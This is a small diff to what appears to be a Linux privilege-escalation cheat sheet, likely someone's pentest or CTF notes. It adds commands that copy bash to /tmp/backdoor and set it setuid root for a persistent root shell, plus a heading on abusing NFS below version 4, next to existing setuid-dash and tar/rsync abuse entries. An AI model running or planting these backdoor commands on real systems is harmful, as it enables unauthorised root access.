@@ -112,6 +112,11 @@ cp /bin/dash /tmp/backdoor
 chown root:root /tmp/backdoor
 chmod u+s /tmp/backdoor
 # Execute /tmp/backdoor to get a root shell
+
+
+cp /bin/bash /tmp/backdoor
+chmod 6755 /tmp/backdoor
+# Execute /tmp/backdoor -p to get a root shell
 ```
 Use a suid program and use as per context
 getsuid.c
@@ -146,3 +151,6 @@ Check out this fantastic [document](https://www.defensecode.com/public/DefenseCo
 * Abusing `tar`
 * Abusing `rsync`
 
+## Abusing NFS < 4
+
+Refer to my [personal notes](https://www.notion.so/NFS-4-689ff63036654c3f8e3bda2deef9f6e5) for exploiting NFS < 4
